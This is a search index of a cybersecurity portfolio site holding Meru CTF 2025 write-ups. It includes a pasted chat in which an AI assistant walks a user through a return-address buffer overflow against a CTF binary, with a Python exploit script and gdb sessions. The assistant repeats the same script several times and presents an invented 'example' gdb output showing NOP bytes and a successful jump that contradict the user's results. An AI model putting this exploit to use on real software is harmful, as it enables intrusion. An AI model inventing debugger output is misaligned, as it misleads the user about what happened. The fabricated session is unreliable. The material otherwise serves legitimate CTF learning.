{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome to My Cybersecurity Portfolio","text":"<p>Hello there!</p> <p>This portfolio documents my journey in cybersecurity and hands-on problem solving through:</p> <ul> <li>CTF Writeups: TryHackMe, HackTheBox, OverTheWire, VulnHub, PicoCTF</li> <li>Notes: Linux, Windows, Web Security, Networking, Reverse Engineering</li> <li>Projects: Scripts, automation tools, and small security projects</li> </ul>"},{"location":"#explore","title":"Explore","text":"<ul> <li>About Me \u2013 Learn more about me and my journey</li> <li>Competitions \u2013 All CTF competitions</li> <li>Platforms \u2013 TryHackMe, OverTheWire, VulnHub</li> </ul> <p>Thank you for visiting \u2014 happy hacking! \ud83d\udee1\ufe0f</p>"},{"location":"about/","title":"About Me","text":"<p>Hello there!</p> <p>I maintain this portfolio to document my learning journey and hands-on experience in cybersecurity. My areas of focus include:</p> <ul> <li>Penetration testing and exploitation</li> <li>Capture the Flag (CTF) challenges</li> <li>Linux &amp; Windows security</li> </ul> <p>I create detailed, structured writeups for CTFs and practical exercises, combining screenshots, explanations, and lessons learned.</p> <p>This portfolio is continuously updated as I tackle new challenges and refine my skills.</p> <p>Thank you for visiting!</p>"},{"location":"writeups/","title":"\ud83d\udee1\ufe0f CTF Writeups\u00b6","text":"<p>This repository contains my personal collection of Capture The Flag (CTF) and cybersecurity challenge writeups. It is divided into two major sections:</p>"},{"location":"writeups/#1-platform-based-ctfs","title":"\ud83d\udcc1 1. Platform-Based CTFs\u00b6","text":"<p>These are challenges completed on popular online cybersecurity platforms.</p> <p>Included Platforms\u00b6 HackTheBox TryHackMe VulnHub OverTheWire Each platform is organized by machine/challenge name, and every writeup follows a consistent format with screenshots stored in an assets/ folder and referenced using standard Markdown:</p>"},{"location":"writeups/#2-competition-based-ctfs","title":"\ud83c\udfc6 2. Competition-Based CTFs\u00b6","text":"<p>These are writeups from formal competitions, events, and school-based cybersecurity contests.</p> <p>Included Competitions\u00b6 PicoCTF Meru CTF 2025 (More will be added as I participate in new events)</p>"},{"location":"writeups/competitions/","title":"Competitions\u00b6","text":"<p>This section contains writeups from various cybersecurity competitions I have participated in. Each event includes challenge breakdowns, methodologies, and solutions across different categories.</p>"},{"location":"writeups/competitions/#available-competitions","title":"Available Competitions\u00b6","text":"<ul> <li>Meru CTF 2025</li> <li>PicoCTF (coming soon)</li> <li>Other CTFs will be added here as I complete and upload their writeups.</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/","title":"Meru CTF 2025 Writeups\u00b6","text":"<p>This section documents my writeups from the Meru CTF 2025 competition. Each writeup reflects a structured methodology, practical problem-solving, and lessons learned across multiple cybersecurity domains.</p>"},{"location":"writeups/competitions/meru-ctf-2025/#what-my-writeups-include","title":"What my writeups include\u00b6","text":"<ul> <li>Step-by-step challenge analysis</li> <li>Exploitation methodology and reasoning</li> <li>Screenshots, commands, and outputs</li> <li>Key takeaways for each challenge</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/#categories","title":"Categories\u00b6","text":""},{"location":"writeups/competitions/meru-ctf-2025/#binary-exploitation","title":"Binary Exploitation","text":"<ul> <li>BufferLand</li> <li>Vaultkeeper - Strings will not save you</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/#cryptography","title":"Cryptography","text":"<ul> <li>Crypto</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/#forensics","title":"Forensics","text":"<ul> <li>Red-Mystery</li> <li>Stewie's Final Route</li> <li>Where's Stewie</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/#miscellaneous","title":"Miscellaneous","text":"<ul> <li>Maze of Lies</li> <li>QRious S3cr3et5</li> <li>Select1v3</li> <li>Welcome Fl4g</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/BufferLand/bufferland/","title":"Bufferland","text":""},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/BufferLand/bufferland/#description","title":"Description","text":"<p>Welcome to Bufferland, an ancient realm where knowledge is power and memory is brittle. A humble strory-teller invites you to share your tale - but beware: beyond his soft words lies a vulnerable stack. Only by telling a long enough story will you bend the flow of fate and uncover the vault he guards. You've found an unprotected binary, and i's waiting for your input. But nothing you say seems to impress it - unless you're willing to step out of bounds</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/BufferLand/bufferland/#hint","title":"Hint","text":"<p>\"Those who overwrite the past shall change their future.\" The vault lies just beyond 64 characters ... </p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/BufferLand/bufferland/#solution","title":"Solution","text":"<p>I began by making the binary executable and running it to observe its behavior</p> <pre><code>chmod +x chall \n\n./chall  \n</code></pre> <p></p> <p>The program greeted me with a message about \"Bufferland\" and prompted for input. Entering a string just resulted in a generic response, with no flag revealed.</p> <p>Next, I used\u00a0<code>strings</code>\u00a0to scan for any readable text within the binary</p> <pre><code>$ strings chall  \n</code></pre> <p></p> <p>This revealed several interesting lines, one including the flag</p> <p>To confirm, I also loaded the binary into <code>Cutter</code> for disassembly. Searching through the strings and functions, I found the flag hardcoded</p> <pre><code>cutter chall\n</code></pre> <p></p> <pre><code>Flag : flag{buffering_into_the_void}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/","title":"AI Walkthrough","text":"<p>Based on the provided decompilation and the flag encoding, you've correctly decoded the flag. Now, let's ensure we craft the correct exploit to print this flag by exploiting the buffer overflow vulnerability.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#steps-to-craft-the-exploit","title":"Steps to Craft the Exploit","text":"<ol> <li>Confirm the Offset: The offset to the return address is 72 bytes (64 bytes for the buffer + 8 bytes for the saved RBP).</li> <li>Correct Address Format: Ensure the address of\u00a0<code>print_flag()</code>\u00a0is correctly formatted in little-endian.</li> <li>Align the Stack: Make sure the stack is properly aligned when returning to\u00a0<code>print_flag()</code>.</li> </ol>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#refined-python-exploit-script","title":"Refined Python Exploit Script","text":"<p>Let's create a Python script to generate the payload:</p> <p>python</p> <p>Copy code</p> <pre><code>from struct import pack\n\n# Define the sizes and addresses\nbuffer_size = 64\nsaved_rbp_size = 8\nret_addr = 0x401199  # Address of print_flag from nm output\n\n# Craft the payload\npayload = b\"A\" * buffer_size       # Fill the buffer with 'A's\npayload += b\"B\" * saved_rbp_size   # Overwrite the saved RBP with 'B's\npayload += pack(\"&lt;Q\", ret_addr)    # Overwrite the return address with print_flag address (little endian)\n\n# Print the payload\nprint(payload)\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#running-the-exploit","title":"Running the Exploit","text":"<p>Save the payload to a file and run the exploit:</p> <p>sh</p> <p>Copy code</p> <pre><code>python3 exploit.py &gt; payload\n./glory &lt; payload\n</code></pre> <p>Or directly pipe the output:</p> <p>sh</p> <p>Copy code</p> <pre><code>python3 exploit.py | ./glory\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#additional-debugging-with-gdb","title":"Additional Debugging with\u00a0<code>gdb</code>","text":"<p>If the segmentation fault persists, use\u00a0<code>gdb</code>\u00a0to debug the issue:</p> <ol> <li>Start\u00a0<code>gdb</code>\u00a0with the binary:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>gdb ./glory\n</code></pre> <ol> <li>Set a breakpoint at the\u00a0<code>print_flag</code>\u00a0function:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) break *0x401199\n</code></pre> <ol> <li>Run the program with the payload:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) run &lt; payload\n</code></pre> <ol> <li>Examine the stack and registers\u00a0to ensure everything is correctly aligned:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) info registers\n(gdb) x/10x $rsp\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#example-gdb-session","title":"Example\u00a0<code>gdb</code>\u00a0Session","text":"<p>Here's an example of what a\u00a0<code>gdb</code>\u00a0session might look like:</p> <p>sh</p> <p>Copy code</p> <pre><code>gdb ./glory\n(gdb) break *0x401199\nBreakpoint 1 at 0x401199\n(gdb) run &lt; payload\nStarting program: /path/to/glory &lt; payload\n\nWelcome again, brave soul.\nThe vault now guards its secrets well.\nNo strings can reveal what memory conceals...\n\nSo tell me your tale once more:\nAlas, your tale ends here...\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000401199 in print_flag ()\n(gdb) info registers\nrax            0x0  0\nrbx            0x0  0\nrcx            0x0  0\nrdx            0x0  0\nrsi            0x0  0\nrdi            0x0  0\nrbp            0x7fffffffe1f0  0x7fffffffe1f0\nrsp            0x7fffffffe1e0  0x7fffffffe1e0\nr8             0x0  0\nr9             0x0  0\nr10            0x0  0\nr11            0x0  0\nr12            0x0  0\nr13            0x0  0\nr14            0x0  0\nr15            0x0  0\nrip            0x401199  0x401199 &lt;print_flag&gt;\neflags         0x10202  [ IF RF ]\ncs             0x33  51\nss             0x2b  43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) x/10x $rsp\n0x7fffffffe1e0: 0x4141414141414141  0x4242424242424242\n0x7fffffffe1f0: 0x9090909090909090  0x9090909090909090\n0x7fffffffe200: 0x9090909090909090  0x9090909090909090\n0x7fffffffe210: 0x9090909090909090  0x9090909090909090\n0x7fffffffe220: 0x9090909090909090  0x9090909090909090\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#conclusion","title":"Conclusion","text":"<p>By ensuring the correct offset, address format, and stack alignment, you should be able to successfully exploit the buffer overflow and print the flag. If the segmentation fault persists, the\u00a0<code>gdb</code>\u00a0output will provide more insights into what might be going wrong.</p> <p>New</p> <p>New</p> <p>I have used that exploit, but nothing. SO, does it mean that this is the issue in registers? rip 0x40129c 0x40129c  <p>Venice</p> <p>Given that the\u00a0<code>rip</code>\u00a0register points to\u00a0<code>0x40129c</code>\u00a0which is within the\u00a0<code>vulnerable</code>\u00a0function, it indicates that the return address on the stack was not correctly overwritten. This suggests that the offset calculation or the payload construction might be incorrect.</p> <p>Let's re-evaluate the offset and ensure that the payload is correctly crafted.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#re-evaluating-the-offset","title":"Re-evaluating the Offset","text":"<p>The buffer size is 64 bytes, and on a typical x86_64 system, the stack layout after the buffer would be:</p> <ol> <li>64 bytes for the buffer (<code>local_48</code>).</li> <li>8 bytes for the saved base pointer (RBP).</li> <li>8 bytes for the return address.</li> </ol> <p>So, the total offset to the return address from the start of the buffer should be:</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#refined-python-exploit-script_1","title":"Refined Python Exploit Script","text":"<p>Let's create a more robust payload that ensures proper alignment and correct offset:</p> <p>python</p> <p>Copy code</p> <pre><code>from struct import pack\n\n# Define the sizes and addresses\nbuffer_size = 64\nsaved_rbp_size = 8\nret_addr = 0x401199  # Address of print_flag from nm output\n\n# Craft the payload\npayload = b\"A\" * buffer_size       # Fill the buffer with 'A's\npayload += b\"B\" * saved_rbp_size   # Overwrite the saved RBP with 'B's\npayload += pack(\"&lt;Q\", ret_addr)    # Overwrite the return address with print_flag address (little endian)\n\n# Print the payload\nprint(payload)\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#running-the-exploit_1","title":"Running the Exploit","text":"<p>Save the payload to a file and run the exploit:</p> <p>sh</p> <p>Copy code</p> <pre><code>python3 exploit.py &gt; payload\n./glory &lt; payload\n</code></pre> <p>Or directly pipe the output:</p> <p>sh</p> <p>Copy code</p> <pre><code>python3 exploit.py | ./glory\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#additional-debugging-with-gdb_1","title":"Additional Debugging with\u00a0<code>gdb</code>","text":"<p>If the segmentation fault persists, use\u00a0<code>gdb</code>\u00a0to debug the issue:</p> <ol> <li>Start\u00a0<code>gdb</code>\u00a0with the binary:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>gdb ./glory\n</code></pre> <ol> <li>Set a breakpoint at the\u00a0<code>print_flag</code>\u00a0function:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) break *0x401199\n</code></pre> <ol> <li>Run the program with the payload:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) run &lt; payload\n</code></pre> <ol> <li>Examine the stack and registers\u00a0to ensure everything is correctly aligned:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) info registers\n(gdb) x/10x $rsp\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#example-gdb-session_1","title":"Example\u00a0<code>gdb</code>\u00a0Session","text":"<p>Here's an example of what a\u00a0<code>gdb</code>\u00a0session might look like:</p> <p>sh</p> <p>Copy code</p> <pre><code>gdb ./glory\n(gdb) break *0x401199\nBreakpoint 1 at 0x401199\n(gdb) run &lt; payload\nStarting program: /path/to/glory &lt; payload\n\nWelcome again, brave soul.\nThe vault now guards its secrets well.\nNo strings can reveal what memory conceals...\n\nSo tell me your tale once more:\nAlas, your tale ends here...\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000401199 in print_flag ()\n(gdb) info registers\nrax            0x0  0\nrbx            0x0  0\nrcx            0x0  0\nrdx            0x0  0\nrsi            0x0  0\nrdi            0x0  0\nrbp            0x7fffffffe1f0  0x7fffffffe1f0\nrsp            0x7fffffffe1e0  0x7fffffffe1e0\nr8             0x0  0\nr9             0x0  0\nr10            0x0  0\nr11            0x0  0\nr12            0x0  0\nr13            0x0  0\nr14            0x0  0\nr15            0x0  0\nrip            0x401199  0x401199 &lt;print_flag&gt;\neflags         0x10202  [ IF RF ]\ncs             0x33  51\nss             0x2b  43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) x/10x $rsp\n0x7fffffffe1e0: 0x4141414141414141  0x4242424242424242\n0x7fffffffe1f0: 0x9090909090909090  0x9090909090909090\n0x7fffffffe200: 0x9090909090909090  0x9090909090909090\n0x7fffffffe210: 0x9090909090909090  0x9090909090909090\n0x7fffffffe220: 0x9090909090909090  0x9090909090909090\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#conclusion_1","title":"Conclusion","text":"<p>If the\u00a0<code>rip</code>\u00a0register still points to an incorrect address, it suggests that the return address on the stack was not correctly overwritten. Ensure that the offset is correct and that the payload is correctly formatted. If necessary, add more NOP slides to ensure proper stack alignment. The\u00a0<code>gdb</code>\u00a0output will provide more insights if the issue persists.</p> <p>New</p> <p>New</p> <p>In all of thse, what I seem to understand is that it redirects it to Program received signal SIGSEGV, Segmentation fault. 0x000000000040129c in vulnerable () instead of the print_flag option: rip 0x401199 0x401199 , as you are suggesting here <p>Venice</p> <p>Given that the\u00a0<code>rip</code>\u00a0register points to\u00a0<code>0x40129c</code>\u00a0within the\u00a0<code>vulnerable</code>\u00a0function, it indicates that the return address on the stack was not correctly overwritten. This suggests that the offset calculation or the payload construction might be incorrect.</p> <p>Let's re-evaluate the offset and ensure that the payload is correctly crafted. We'll also add more debugging information to understand what's going wrong.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#re-evaluating-the-offset_1","title":"Re-evaluating the Offset","text":"<p>The buffer size is 64 bytes, and on a typical x86_64 system, the stack layout after the buffer would be:</p> <ol> <li>64 bytes for the buffer (<code>local_48</code>).</li> <li>8 bytes for the saved base pointer (RBP).</li> <li>8 bytes for the return address.</li> </ol> <p>So, the total offset to the return address from the start of the buffer should be:</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#refined-python-exploit-script_2","title":"Refined Python Exploit Script","text":"<p>Let's create a more robust payload that ensures proper alignment and correct offset. We'll also add debugging information to print the payload in a readable format:</p> <p>python</p> <p>Copy code</p> <pre><code>from struct import pack\n\n# Define the sizes and addresses\nbuffer_size = 64\nsaved_rbp_size = 8\nret_addr = 0x401199  # Address of print_flag from nm output\n\n# Craft the payload\npayload = b\"A\" * buffer_size       # Fill the buffer with 'A's\npayload += b\"B\" * saved_rbp_size   # Overwrite the saved RBP with 'B's\npayload += pack(\"&lt;Q\", ret_addr)    # Overwrite the return address with print_flag address (little endian)\n\n# Print the payload in a readable format for debugging\nprint(\"Payload in hex:\")\nprint(payload.hex())\nprint(\"Payload in ASCII:\")\nprint(payload.decode('ascii', errors='ignore'))\n\n# Save the payload to a file\nwith open('payload', 'wb') as f:\n    f.write(payload)\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#running-the-exploit_2","title":"Running the Exploit","text":"<p>Save the payload to a file and run the exploit:</p> <p>sh</p> <p>Copy code</p> <pre><code>python3 exploit.py\n./glory &lt; payload\n</code></pre> <p>Or directly pipe the output:</p> <p>sh</p> <p>Copy code</p> <pre><code>python3 exploit.py | ./glory\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#additional-debugging-with-gdb_2","title":"Additional Debugging with\u00a0<code>gdb</code>","text":"<p>If the segmentation fault persists, use\u00a0<code>gdb</code>\u00a0to debug the issue:</p> <ol> <li>Start\u00a0<code>gdb</code>\u00a0with the binary:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>gdb ./glory\n</code></pre> <ol> <li>Set a breakpoint at the\u00a0<code>print_flag</code>\u00a0function:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) break *0x401199\n</code></pre> <ol> <li>Run the program with the payload:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) run &lt; payload\n</code></pre> <ol> <li>Examine the stack and registers\u00a0to ensure everything is correctly aligned:</li> </ol> <p>sh</p> <p>Copy code</p> <pre><code>(gdb) info registers\n(gdb) x/10x $rsp\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#example-gdb-session_2","title":"Example\u00a0<code>gdb</code>\u00a0Session","text":"<p>Here's an example of what a\u00a0<code>gdb</code>\u00a0session might look like:</p> <p>sh</p> <p>Copy code</p> <pre><code>gdb ./glory\n(gdb) break *0x401199\nBreakpoint 1 at 0x401199\n(gdb) run &lt; payload\nStarting program: /path/to/glory &lt; payload\n\nWelcome again, brave soul.\nThe vault now guards its secrets well.\nNo strings can reveal what memory conceals...\n\nSo tell me your tale once more:\nAlas, your tale ends here...\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000401199 in print_flag ()\n(gdb) info registers\nrax            0x0  0\nrbx            0x0  0\nrcx            0x0  0\nrdx            0x0  0\nrsi            0x0  0\nrdi            0x0  0\nrbp            0x7fffffffe1f0  0x7fffffffe1f0\nrsp            0x7fffffffe1e0  0x7fffffffe1e0\nr8             0x0  0\nr9             0x0  0\nr10            0x0  0\nr11            0x0  0\nr12            0x0  0\nr13            0x0  0\nr14            0x0  0\nr15            0x0  0\nrip            0x401199  0x401199 &lt;print_flag&gt;\neflags         0x10202  [ IF RF ]\ncs             0x33  51\nss             0x2b  43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) x/10x $rsp\n0x7fffffffe1e0: 0x4141414141414141  0x4242424242424242\n0x7fffffffe1f0: 0x9090909090909090  0x9090909090909090\n0x7fffffffe200: 0x9090909090909090  0x9090909090909090\n0x7fffffffe210: 0x9090909090909090  0x9090909090909090\n0x7fffffffe220: 0x9090909090909090  0x9090909090909090\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#conclusion_2","title":"Conclusion","text":"<p>By ensuring the correct offset, address format, and stack alignment, you should be able to successfully exploit the buffer overflow and print the flag. If the segmentation fault persists, the\u00a0<code>gdb</code>\u00a0output will provide more insights into what might be going wrong.</p> <p>The behavior you're seeing \u2014 the program printing \"Alas, your tale ends here...\" and then \"The vault remains sealed.\" without printing the flag \u2014 means your payload did\u00a0not\u00a0successfully redirect control flow to the\u00a0<code>print_flag()</code>\u00a0function. Instead, the program continued normal execution after\u00a0<code>vulnerable()</code>\u00a0returned.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#what-this-implies","title":"What this implies","text":"<ul> <li> <p>Your payload\u00a0did not overwrite the return address correctly, or</p> </li> <li> <p>The address you used for\u00a0<code>print_flag()</code>\u00a0is incorrect or not being jumped to, or</p> </li> <li> <p>Some protection (like stack canaries or ASLR) is preventing your exploit.</p> </li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#checklist-next-steps-to-fix-the-exploit","title":"Checklist &amp; Next Steps to Fix the Exploit","text":""},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#1-confirm-the-offset-to-the-return-address","title":"1. Confirm the offset to the return address","text":"<p>Make sure you know exactly how many bytes to overflow before hitting the return address.</p> <ul> <li>Use a cyclic pattern to find the offset:</li> </ul> <p>bash</p> <p><code># Generate a cyclic pattern of 100 bytes python3 -c \"from pwn import *; print(cyclic(100))\" &gt; pattern # Run the program with the pattern as input ./glory &lt; pattern</code></p> <ul> <li>When it crashes, open\u00a0<code>gdb</code>\u00a0and find the overwritten return address value:</li> </ul> <p>bash</p> <p><code>gdb ./glory run &lt; pattern # After crash, find the value of RIP (instruction pointer) info registers rip # Or check the stack to find the offset</code></p> <ul> <li>Use pwntools to find the offset:</li> </ul> <p>python</p> <p><code>from pwn import * offset = cyclic_find(&lt;value_of_rip&gt;) print(offset)</code></p> <p>This gives you the exact number of bytes needed to overwrite the return address.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#2-verify-the-address-of-print_flag","title":"2. Verify the address of\u00a0<code>print_flag()</code>","text":"<ul> <li>Use\u00a0<code>nm</code>\u00a0or\u00a0<code>objdump</code>\u00a0to get the exact address:</li> </ul> <p>bash</p> <p><code>nm ./glory | grep print_flag</code></p> <ul> <li>Confirm the address is correct and that the binary is\u00a0not PIE\u00a0(if PIE is enabled, addresses will change each run).</li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#3-disable-aslr-for-testing","title":"3. Disable ASLR (for testing)","text":"<p>ASLR randomizes memory addresses on each run, making exploitation harder.</p> <p>Disable it temporarily:</p> <p>bash</p> <p><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#4-check-for-stack-canaries","title":"4. Check for stack canaries","text":"<p>Run\u00a0<code>checksec</code>\u00a0on the binary:</p> <p>bash</p> <p><code>checksec ./glory</code></p> <p>If stack canaries are enabled, your overflow will be detected and the program will terminate before executing your payload.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#5-craft-the-payload-with-correct-offset-and-address","title":"5. Craft the payload with correct offset and address","text":"<p>Once you have the correct offset and address, build the payload:</p> <p>python</p> <p><code>from struct import pack offset = &lt;correct_offset&gt; print_flag_addr = 0x&lt;print_flag_address&gt;  # replace with actual address payload = b\"A\" * offset payload += pack(\"&lt;Q\", print_flag_addr) print(payload.decode('latin-1'))  # or write to file and pipe</code></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#6-run-the-exploit","title":"6. Run the exploit","text":"<p>bash</p> <p><code>python3 exploit.py | ./glory</code></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#summary","title":"Summary","text":"<p>Your payload is not working because the return address is not correctly overwritten or the address is wrong. Use a cyclic pattern to find the exact offset, verify the\u00a0<code>print_flag()</code>\u00a0address, and check for protections like ASLR or stack canaries.</p> <p>The error\u00a0<code>NameError: name 'cyclic_find' is not defined</code>\u00a0happens because you imported\u00a0<code>from pwn import *</code>\u00a0but did not import\u00a0<code>cyclic_find</code>\u00a0explicitly or you are calling it without prefix.</p> <p>In pwntools,\u00a0<code>cyclic_find</code>\u00a0is inside the\u00a0<code>pwnlib.util.cyclic</code>\u00a0module, and you can import it explicitly or call it via\u00a0<code>pwn.cyclic_find</code>.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#how-to-fix-your-script","title":"How to fix your script","text":"<p>Option 1: Import cyclic_find explicitly</p> <p>python</p> <p><code>from pwn import cyclic_find offset = cyclic_find(0x40129c)  # or the value you want to find print(offset)</code></p> <p>Option 2: Import everything and call with prefix</p> <p>python</p> <p><code>from pwn import * offset = cyclic_find(0x40129c)  # should work if imported * print(offset)</code></p> <p>If it still fails, try:</p> <p>python</p> <p><code>import pwn offset = pwn.cyclic_find(0x40129c) print(offset)</code></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#important-note-on-cyclic_find-argument","title":"Important note on\u00a0<code>cyclic_find</code>\u00a0argument","text":"<ul> <li> <p>If you pass an integer like\u00a0<code>0x40129c</code>,\u00a0<code>cyclic_find</code>\u00a0expects a 4-byte little-endian integer.</p> </li> <li> <p>If you want to find the offset of bytes in a cyclic pattern, pass the bytes, not the address directly.</p> </li> <li> <p>For example, if you have a crash address, convert it to bytes first:</p> </li> </ul> <p>python</p> <p><code>from pwn import * # Suppose the crash address is 0x61616162 (b'a a a b') crash_bytes = pack(\"&lt;I\", 0x61616162)  # pack as 4-byte little endian offset = cyclic_find(crash_bytes) print(offset)</code></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/AI%20Walkthrough/#summary_1","title":"Summary","text":"<ul> <li> <p>Import\u00a0<code>cyclic_find</code>\u00a0explicitly or call it with\u00a0<code>pwn.cyclic_find</code>.</p> </li> <li> <p>Pass a bytes object (4 bytes) to\u00a0<code>cyclic_find</code>, not a raw integer.</p> </li> <li> <p>Use\u00a0<code>pack(\"&lt;I\", value)</code>\u00a0to convert integer to bytes before calling\u00a0<code>cyclic_find</code>.</p> </li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/","title":"Vaultkeeper","text":""},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#description","title":"Description","text":"<p>The vaulkeeper has learned from Bufferland's mistakes. No longer does he leave the flag out in the pen. He mocks your tools, your reliance on strings, and your lazy static analysis. But the flaw still lies within - hidden, yes, but not unreachable. To reveal the secret now, you must force the keeper to construct it.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#hint","title":"Hint","text":"<p>\"The flag is real, but not revealed - until you walk the path unwritten.\" You won't see it, but you can still reach it. Try harder</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#solution","title":"Solution","text":"<p>This challenge appeared to be a follow-up to the previous Bufferland task, so I expected another binary exploitation scenario.</p> <p>I started by making the binary executable and running it</p> <pre><code>chmod +x glory\n\n./glory\n</code></pre> <p></p> <p>The program greeted me, asked for input, and then ended with \u201cThe vault remains sealed.\u201d Trying simple input didn\u2019t reveal anything.</p> <p>Next, I ran\u00a0<code>strings</code>\u00a0and explored the binary in Cutter, but found nothing useful. I then turned to <code>Ghidra</code> for a deeper look</p> <p>Before I even continue to get the flag, I analyzed the codes in the binary and made a notice</p> <p>There are 4 functions here that we need to analyze : intro, main, 